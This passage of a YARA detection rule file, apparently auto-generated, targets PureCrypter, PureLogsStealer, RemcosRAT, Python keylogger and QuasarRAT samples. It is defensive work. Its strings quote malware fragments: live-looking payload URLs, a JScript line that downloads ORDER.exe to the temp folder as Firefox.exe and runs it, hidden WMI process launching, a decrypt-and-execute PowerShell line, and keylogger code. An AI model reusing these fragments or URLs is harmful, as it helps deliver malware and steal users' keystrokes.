      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s4 = "    return -not (Get-Process $ProcessName -ErrorAction SilentlyContinue)" fullword ascii /* score: '22.00'*/
      $s5 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s6 = "oFuSy/R/arksJn5em1M/W+LcnskBJYx8Nygg0hdDLOaLGlginOSslQMJmQmxWpO9cUw6duXrdohoVYVZqT/fLWqDRzzyjHduMpLBxtr7EOaOhY42QLH0COOME05yIYPj" ascii /* score: '21.00'*/
      $s7 = "DpOrsmzqNTZtqDXDirCMyH8NR7oYEZvEruXDLLtLiTc/QCvHOmZ9KwWGq8N9nx6TYfPlM5cUuIh1jOHuggModRYHAONceklXb6VBhXKZASZd5KhRR05HUfC9C8OvyzQR" ascii /* score: '21.00'*/
      $s8 = "bQfU831B/pWCU6zdJoqRWploHrQst51OAmLKjFBvW8R/BJ1Wx4HqVsd38T0+N8TSXGz9sRfoEeyenj9RH5DuDDGRDJgo1xuddLlCcGy3/s5jZB60z5RIO+6JiP4bdWSR" ascii /* score: '21.00'*/
      $s9 = "BeyebEJ54Xl/pVU6WawUwCvtnthLOGJ9XtSTau56R++PIQslzO2vn+wKm7TMrTzpWPLfNOpWP9SzSnFXwnBJMH7ZfPUlVmMEG0qEguqj6/yvkbVblhAgA9Z4g7nIZp+J" ascii /* score: '21.00'*/
      $s10 = "WgvrIQ02h8f250ojK8bAPB6tTRor4aaY0Z95YSpyPcLdHaV3VDYQ5Yh7QM3lDbhqYuzHDgIhjF63NzXb1UtZxYtCIwMsIe9FaIra3cqZmVtRI2ddHxa3+4l5H4K57bvW" ascii /* score: '21.00'*/
      $s11 = "c5hvhyYPa49H8NK8wIX+8DYCJVjqG0Vgx3IrC04sEkIG8sVkqsvJ4GuGCWeAEgQ9otmKclv8FAP4IooXP3dGhKxYYvqETl/T7VmMjlQJuWEyM02EyeT2emZ+1x34y6CW" ascii /* score: '21.00'*/
      $s12 = "6jVIBY5iTvyppAR4hdkeYe5CbTe2O13geaubdekrMqnVfWt0mWk4FmbFtp2MwEg+HCvucGSo8AbUHYUCQ151JI6qRM2aeI/NX+bBueYcAURE49V330NffeomJgJ4W7hM" ascii /* score: '20.00'*/
      $s13 = "RwwuRsDe52ow8ZrR+4DuhlbdoSNlJyfbfuiPrVZBArTLx0u70Wcd/8dsKBTyi4X1vmS34FmjereYD8ggHU2qEYBGUbmWOuyetHdDIK2SspY+WOZ+ZZsgDXziCoU1A4nr" ascii /* score: '20.00'*/
      $s14 = "CYsuPfu2ZniRCuSJukTM39vcUiFs2MdWc09BXXO83quPxHCeEBINmxa5V7EasUo2SQQvb533p5dyc23KAYeV5fgH+PR2jw66WOSNvWFQsfmGbE3IbSY6Rk42J2esRnz9" ascii /* score: '19.00'*/
      $s15 = "hazYgH4GyEFUKk7aMcHrY0GnMloGQ9mFUBiNlmRnxqSHSUMZJc0sCHqjAfa48jhj6zWmbHXxAQhgO8UGK7xfj+CQo6e3Q/ZKS0YzS2BZVnCvhoIc30mDrwM4TUECDlVe" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9324180a4c4df665a1ef4beb618fc30e6a31c822fd46fa9754b4f00b96548996"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "https://stacysublett.com/wp-content/plugins/Pzbaf.vdf" fullword wide /* score: '22.00'*/
      $s3 = "INV-NEKJD-21000375000837573.exe" fullword wide /* score: '19.00'*/
      $s4 = "XINV-NEKJD-21000375000837573, Version=1.0.6945.6437, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s6 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s7 = "_getBuffer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5e0df245 {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e0df245.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5e0df24506f3c68e55d7d3e76a9c011aa901507c8f3f4ffe808081ca3bfaa8ed"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "https://stacysublett.com/wp-content/plugins/Lyxlvl.vdf" fullword wide /* score: '22.00'*/
      $s3 = "TIM.exe" fullword wide /* score: '19.00'*/
      $s4 = "ATIM, Version=1.0.2996.14209, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s6 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s7 = "_getBuffer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8f0b955e {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8f0b955e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f0b955ee99cd2d58e9b04c1e7958f08b55ad5182044776ceef7e4435542bab6"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "https://stacysublett.com/wp-content/plugins/Ljipe.dat" fullword wide /* score: '22.00'*/
      $s3 = "Qufwkoymbt.exe" fullword wide /* score: '22.00'*/
      $s4 = "535a3c456130" ascii /* score: '17.00'*/ /* hex encoded string 'SZ<Ea0' */
      $s5 = "HQufwkoymbt, Version=1.0.3693.17277, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s7 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s8 = "_getBuffer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule PureLogsStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "12823a38b441a15c437cf020ec102b94c7b1bfd03889b7ef8fa11979bbbc2051"
   strings:
      $s1 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s2 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s3 = "b?* /an" fullword ascii /* score: '9.00'*/
      $s4 = " - f/UF" fullword ascii /* score: '9.00'*/
      $s5 = "jyzhydbu" fullword ascii /* score: '8.00'*/
      $s6 = "bwfbxyox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PureLogsStealer_signature__4 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0fde502e2f51610af8378f310e743131e9051e6b28f3792996c5d829372692cc"
   strings:
      $x1 = "H4sIAAAAAAAEAOy3Y3TlTbcvupIOOrZt2046Njq20bFt2+7Ytm3btm2nb57nxd777H3uOB/ut3tmjapZNfGbs2bV+NdaAMD/pf//Eff11wANQL/+/xiX19VC39LI3l6P" ascii /* score: '68.00'*/
      $s2 = "3h5I3V4RkYjju8vkey3XmkcTHgqS8gEyedVYTWvpeZWHis4d1REUqD32Y3tXirC5pbYRm5PN4k3zkYbl4dBWvM7BHnzYvVqkarFy4VphRaLeIpgKzi+4KF7XSDIoYdUY" ascii /* score: '24.00'*/
      $s3 = "w9NNlbL12jWjj6NgAELL88Z2xauILdAcEf6r9dLlNgzFTY057bs1rNVPklOGDt0fO/pKxqoLaFjGf2OxylRSRzIARlbdFepoAzhxIKt0WJ7yFXYjU7s9z4hVJc2A5G5H" ascii /* score: '21.00'*/
      $s4 = "apmSRy3jf5O3BpeSTnxPFbhOC8zbTwuq6eO+/73CLJ5PCTxVvEl3TJ08TLoTLOgv3JB4BoCgvSWVkLztYHsbVgeTCebLWToHTu+eKH9H9aybYov/Bz7Z3R5fINlrPE3Z" ascii /* score: '21.00'*/
      $s5 = "Wr99WzfO24qyjGSGXK9/Kb2oX0PnBg25eNspTCJnMU+QqA4qbsDGFKdlkqMkGYXHsbymy8JVnsqZxitXOYqfxazhPVy6cqADylQBc4XUv7m3mUJDUmpaataSkHQUyp/a" ascii /* score: '21.00'*/
      $s6 = "ynKvGmY3pTHVH7Q5kirLWYxf8z0e0xSpyJF/s15emr89cQAWkXqNQutOj8XGyW5GU7//CLuZeEIpj3/u+pwiKKnxKE8wYXc/rcggEdbgetaiF37leHMrb53wyokAujXw" ascii /* score: '21.00'*/
      $s7 = "sMkPLBN56QwWmwaVnJSZkfTsGcnI8g2diFzZ4E71pk8XOjvJwaL0CdFogxp/6TrpZFtpbOHzerZPV4tvzmIWKridOzoBGTZIjxyCrowL2jWG7bs/u9KiKOodll+h2Dwg" ascii /* score: '21.00'*/
      $s8 = "8Ha/MGGs/bVUoMLfakEer7DtliY7PN+vyXGdk8Rgzb+l6ZMDdRmxXuG8sftpYV4kiPy7jR2SwMXl6JqwvR1B9zc/14EmdwR80cV0QsaxDpOCEnvu/eIg6ruShMGXKTq3" ascii /* score: '21.00'*/
      $s9 = "S0H2QXZBgdftpcvtn5EA3IRlUHwZA0FGODfr/BHsoD5jE22AjSwy9h2SVKET5q5Q0WFtvNIm4dALEYEHL90sgl1hw6OYdlXhj7pxNYkkPHMTv6suVdKz5CPZxi6WtgQX" ascii /* score: '21.00'*/
      $s10 = "rg+tUBkP3KIL8Sw4k5UafXUU2eilOgmF4eeH1qhy+T6f96LBMrjWYIJqUDlRArw9Utyp1doJzuhX+G2IrZSoGjbOiqTWJIj27GDAbqjYbgs0l2k7dkdllDIrGe4Dbudj" ascii /* score: '21.00'*/
      $s11 = "XTYw74k2a5N1u2xRdjOJN2p3bBktMUigd+bpnkxKJvNZ4nWfHbf7C8W6pb64fTPd7v4CWTUww++XtzY5/nJ5jr+RjW9F17H0hiAya6JPwKNilm2UyzE5l+klOGY4ujzO" ascii /* score: '21.00'*/
      $s12 = "TYX04eGkGak5bOxgLSpYTG7ftqEWszB/2Lf1A2mwRkPQhAyEAaIWI3oAuEmgP7vms28GVbefiLRRg38gGm1SRs4XEKRteT4GwSF7waaa/l68qufuPXURKX9QBWukC8PB" ascii /* score: '20.00'*/
      $s13 = "gdDd6QucF/kBZheTEoQ6H1feUi7llrvvoU036zDc3jo8aHUohQNmS96Tm+E3se0uXjlOguZw7zmw3Yo+5ZfOr4uuySU2/WBW9f7/ilAHWsOMSmRbEObg2NRjym/V3pNN" ascii /* score: '20.00'*/
      $s14 = "oYx1NfBLVBmdsZZFaaUQis3coMEtJeqOueFBFPBr0FjydT58K1xrjHYRr/KY1OhaBuiUS5cbdh+EHrNae58RCwcCfxbb6enNI3XteEXtdW5OPRrqwdlnooKIfdA3oITx" ascii /* score: '19.00'*/
      $s15 = "VEi5wdtdVqiMBbihHtG/Jmvhd9eIbrTuh1iYejOpGTg2Wd44QHDNMqn4TlqG30p3SpYSAEHaDXs3Oue7WEDZIZ+7HxwecmdFNIVHyMOSoOqGH1OCV8/CVtTQvozP723J" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6340 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b09759930e37aa94cce60388ef0c7ef4364efc3504ea7586ca15a35a89b573bb"
   strings:
      $x1 = "H4sIAAAAAAAEAOy2c3hmXbM3eMe2baNj2+nY7ti2bRsdmx0nHdvo2LZtZ/I8L8453zkz813z58zUutaqtQq/qlW1771vAOD/p//vETfD1wILQNX7f+DL525lYG3s6Kj/" ascii /* score: '76.00'*/
      $s2 = "u/XZbYMQh8WrN/OfIPRqdx/+l/A7JeYE+LWlwo4a6DIRcrV8EGMy/cQ2vETsT0QtZbjmTeQk6uJCW5l9Tbr8tTJGJ1PEGO4NZLSzKT2S694InhFH9o+10iqnISFr57RH" ascii /* score: '21.00'*/
      $s3 = "ozc2m63bkZCr1pGETH5M5kodle7afBvc/tcSPYkTlBtNvuDeYG5tIjLvgxrWLjvAbjzc9aZGKtuPS5v7chEDkRyCD+Ze6NNLd8rocj6V0HpPZlZTdbDu9nMxUqnD+yRt" ascii /* score: '21.00'*/
      $s4 = "RGwUUIWj5uegkdkI7LOgvKrhBIn6AIaf/ma+82Tu1EXrF3SC6pg5zfRHk3sg/pv2BJbATNMNcO6IvEvOvGJpxSVEDq7qA7GDrPZ6yDx/ERnBOjaWLfFvLJhVMEb+gwT/" ascii /* score: '19.00'*/
      $s5 = "pqbQmwXHtFwwMZkQV/D7Uk+mHcgqsaeyEUj4MbbPa2O7AuQpeWYwzKTJbmfDMGbgyMiBEz9b3GR7aWb/XyaNye/f5BA/dmTZQcyM3CT6jdgevF99tCcmD+kpwH1/qDEQ" ascii /* score: '19.00'*/
      $s6 = "siIRC2r8FIHHSAukLFnzvfexfF6/AVdv+8nmfXum8kqf/3xOAuwml/nSaUtKOa7MepPXp86E3MrZTjRN99gKquBGqD1LCgHi5ufPs7fNtmPyEG3qmKPcw6rVzTosUfi7" ascii /* score: '19.00'*/
      $s7 = "1eJZxCS7vEgJa60c9PwHapXgyfRPWnD3Lwa2d/4ybW7oczrdI2zc21dHy+XUwkCXEo0Z9pLI7VqEBQi8B29My9/1I6xgi6GetBynryVnUyV9WLpCRyFusV5nLZktx0Vg" ascii /* score: '19.00'*/
      $s8 = "HvWYYiWq5qacDva/FtpHkX2NT1j+96T6LKHPdKR4dKPgE+B56CqhOdmahZWebddDsgZGCmDwZ7opTqgBGUGc8m7uSSW1gMDu02u9jBosmU57pCEWIs0B0d2YpBMWDxW6" ascii /* score: '19.00'*/
      $s9 = "2J2Q+GJK0L3/b1Ph35AkeY5mW3ODEyeHUDLO2zTkFZWesRq8+lsunnvpXxJ5DQ82o4P7M+f+MwvebHIvF4lTe8vABC841tukauUWawEW2TbdjcRjUOXjH6e6/AfexOQL" ascii /* score: '19.00'*/
      $s10 = "DQl7zC/dpgComqaqE7xgh8NStONm4PNxSM/NVadvB3xuOJb3wVFQweuLegV1PYIFTPp2uGCqq0MhJ1O0wWtnRKxSOt/AYsp2pBngcW0dYuFc75ecW+wSdszIBjOevRet" ascii /* score: '19.00'*/
      $s11 = "bJpQ7pp9XdG/ua4sXY4Xa0a/ViTgkjceFNh8v8vG50n4ASI9gGXtGWvxctYv3suhmjj3jZxQ4ctdrcfKh/EGNJMCpDxTubWM67cFrpZXNb7fSVBSXaALbvteMpYIJzvz" ascii /* score: '18.00'*/
      $s12 = "eY9btR8MpmrKNCogSDA7EvMQ/4Z4o61TT+L5r/v51nY/tC4ZuJ7r7FHYL1nxc6GyFDydbNXAPHrz1Y9C4Maz7/RuPoxtrKyqgoqKnU4Oou6JwMRCR3w/uq7kzz5dLEqU" ascii /* score: '18.00'*/
      $s13 = "HKuXAJKfDPSQ3CoqTvWyRlxJ3TP9bpoeBbLAtK16mZFms61oDUdwbGck+JhfSAD1vXSLtterUNRVM+eppPU9rzsG+vMRJZCPdcsI8my2GHUutuwGkg+weP08la4xC1zl" ascii /* score: '18.00'*/
      $s14 = "iXRrOIeUH7SqRC0ul8gU9if/GV259DZIP13SqH8zuWYsiho7iwzLQGHCURhl0ukcr3w/i6QfI67ttpcBDqaYDQHMdf7cdopLbPXmtr357py2t/lGmNA+X5ImHGSA2e36" ascii /* score: '18.00'*/
      $s15 = "6OWlzj4eVTvNCYPwBBB5B9zpoqU5O5vzjx030WW+LhkifL99uBQkbjZRYy6A6/WKK01oTwPHjLaCFnGkeRfjeOEXi8ds8zXTEMpCZ2HzR5M72J1Qa61l2rCntdYMsfMJ" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6340 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__5 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fdcf2f2f6077498f2ba90523b0cf8b4663b2f34c3b651bb07c8a28ab5afbac28"
   strings:
      $s1 = "var readvertising = sulkier.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var fractionalized = sulkier.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var spiffs = eudoxome.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var sulkier = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var bescorn = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "readvertising.ShowWindow = 0; " fullword ascii /* score: '10.00'*/
      $s7 = "var eudoxome = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s8 = "preterit = preterit + '" fullword ascii /* score: '8.00'*/
      $s9 = "g(\\'' + frekz + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule PureLogsStealer_signature__c0117cc2 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_c0117cc2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0117cc2ede8d635c598d49403542e710856ccdc187884bd81e9e1bfa58ba294"
   strings:
      $s1 = "var aniconism = osteal.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var accented = osteal.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var nonpreferred = leafbirds.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var osteal = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var buzzcut = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var leafbirds = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "concerts = concerts + '" fullword ascii /* score: '8.00'*/
      $s8 = "g(\\'' + pseudisodomon + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__0f18a22d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_0f18a22d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0f18a22d54319e113ae30f9f3bd14fdd3c243924e8b8143692952cce72ecf09f"
   strings:
      $s1 = "var monotelephone = ingressu.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var autonomists = ingressu.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var digits = tineoid.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var circus = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '17.00'*/
      $s5 = "var ingressu = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var tineoid = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "var hesitance = autonomists.Create(mortgage, digits, monotelephone, circus);" fullword ascii /* score: '9.00'*/
      $s8 = "mortgage = mortgage + '" fullword ascii /* score: '8.00'*/
      $s9 = "g(\\'' + chronopher + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__13bf4765 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_13bf4765.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "13bf4765b4dd68eac1ba87a7c5d567a3baf7e3346f7dc6adcc843ba7da04f5c0"
   strings:
      $s1 = "var multibooting = spuddle.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var krach = spuddle.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var victrice = extremadamente.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var zanjero = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var spuddle = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "trunnels = trunnels + '" fullword ascii /* score: '11.00'*/
      $s7 = "var extremadamente = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s8 = "g(\\'' + Kuria + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__2d0f39d6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_2d0f39d6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2d0f39d696f56871af658067664d2bd79b77928ba7b289393b9f7e75ac85e321"
   strings:
      $s1 = "var dichotomised = atractenchyma.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s3 = "var curriers = atractenchyma.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s4 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s5 = "var comether = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '20.00'*/
      $s6 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s7 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s8 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s9 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s10 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s11 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s12 = "var olivine = cauliform.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '15.00'*/
      $s13 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s14 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
      $s15 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      8 of them
}

rule RemcosRAT_signature__4d1b163b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_4d1b163b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4d1b163bb13e2156bb5574bd8d885474cf214e003b4b4ea5be19cea3a0635d26"
   strings:
      $x1 = "DfL('https://raw.githubusercontent.com/jaybobo1/Supplier/refs/heads/main/ORDER.exe', foul + '\\\\Firefox.exe');" fullword ascii /* score: '34.00'*/
      $s2 = "var foul = WshShell.ExpandEnvironmentStrings(\"%TEMP%\");" fullword ascii /* score: '20.00'*/
      $s3 = "    MyObject.Run(foul + \"\\\\Firefox.exe\");" fullword ascii /* score: '13.00'*/
      $s4 = "var WshShell = WScript.CreateObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s5 = "MyObject = new ActiveXObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
      $s6 = "        WScript.Echo('not supported');" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature__432e84e3 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_432e84e3.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "432e84e33186151d6a6e6f97f724ec349c599315f7d3f1d11930796a391bd731"
   strings:
      $s1 = "var kitchenless = Ahhnold.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s2 = "var cervicicardiac = Ahhnold.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '22.00'*/
      $s3 = "var flagonet = nonchargeable.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var Ahhnold = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var morphe = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "uaterfoilTquaterfoilWquaterfoilVquaterfoil0quaterfoilaquaterfoilGquaterfoil9quaterfoilkquaterfoilKquaterfoilCquaterfoildquaterfo" ascii /* score: '11.00'*/
      $s7 = "rfoilJquaterfoilyquaterfoilwquaterfoilnquaterfoilVquaterfoilGquaterfoilFquaterfoilzquaterfoilaquaterfoil1quaterfoil9quaterfoilOq" ascii /* score: '11.00'*/
      $s8 = "terfoilIquaterfoilgquaterfoilPquaterfoilSquaterfoilAquaterfoilkquaterfoilbquaterfoilWquaterfoilFquaterfoil0quaterfoilYquaterfoil" ascii /* score: '11.00'*/
      $s9 = "erfoil0quaterfoilYquaterfoilXquaterfoilJquaterfoil0quaterfoilLquaterfoilSquaterfoilgquaterfoiluquaterfoilKquaterfoiljquaterfoil8" ascii /* score: '11.00'*/
      $s10 = "uaterfoilYquaterfoilWquaterfoil1quaterfoillquaterfoilJquaterfoilyquaterfoilwquaterfoilnquaterfoilMquaterfoilCquaterfoilcquaterfo" ascii /* score: '11.00'*/
      $s11 = "il1quaterfoilaquaterfoilWquaterfoilxquaterfoilkquaterfoilJquaterfoilyquaterfoilwquaterfoilnquaterfoilJquaterfoilyquaterfoilwquat" ascii /* score: '11.00'*/
      $s12 = "lbquaterfoilWquaterfoilVquaterfoil0quaterfoilaquaterfoilGquaterfoil9quaterfoilkquaterfoilIquaterfoilDquaterfoil0quaterfoilgquate" ascii /* score: '11.00'*/
      $s13 = "aterfoilEquaterfoil5quaterfoil5quaterfoilQquaterfoilWquaterfoilpquaterfoilNquaterfoilZquaterfoiljquaterfoillquaterfoiltquaterfoi" ascii /* score: '11.00'*/
      $s14 = "terfoilJquaterfoilsquaterfoilequaterfoilSquaterfoil5quaterfoilHquaterfoilZquaterfoilXquaterfoilRquaterfoilUquaterfoilequaterfoil" ascii /* score: '11.00'*/
      $s15 = "terfoilxquaterfoilpquaterfoilZquaterfoilWquaterfoil5quaterfoil0quaterfoilOquaterfoilyquaterfoilAquaterfoilkquaterfoildquaterfoil" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 40KB and
      8 of them
}

rule PythonStealer_signature_ {
   meta:
      description = "_subset_batch - file PythonStealer(signature).py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ca2a5e7f99ccff9b88b67c1919a3cce5fe19adf2aa85ed3884c3da48bfc5d14"
   strings:
      $s1 = "logFile = \"/home/diegorego/keylogger_black_genesis/log.txt\"" fullword ascii /* score: '24.00'*/
      $s2 = " \"Key.cmd\": \"\"," fullword ascii /* score: '12.00'*/
      $s3 = "def writeLog(key):" fullword ascii /* score: '12.00'*/
      $s4 = "with Listener(on_press=writeLog) as l:" fullword ascii /* score: '12.00'*/
      $s5 = "o do arquivo de log" fullword ascii /* score: '11.00'*/
      $s6 = "#abrir o arquivo de log no modo append" fullword ascii /* score: '9.00'*/
      $s7 = "with open(logFile, \"a\") as f:" fullword ascii /* score: '9.00'*/
      $s8 = "rio com as teclas a serem traduzidas" fullword ascii /* score: '9.00'*/
      $s9 = "o writeLog" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6523 and filesize < 6KB and
      all of them
}

rule QuasarRAT_signature__3 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature).js"
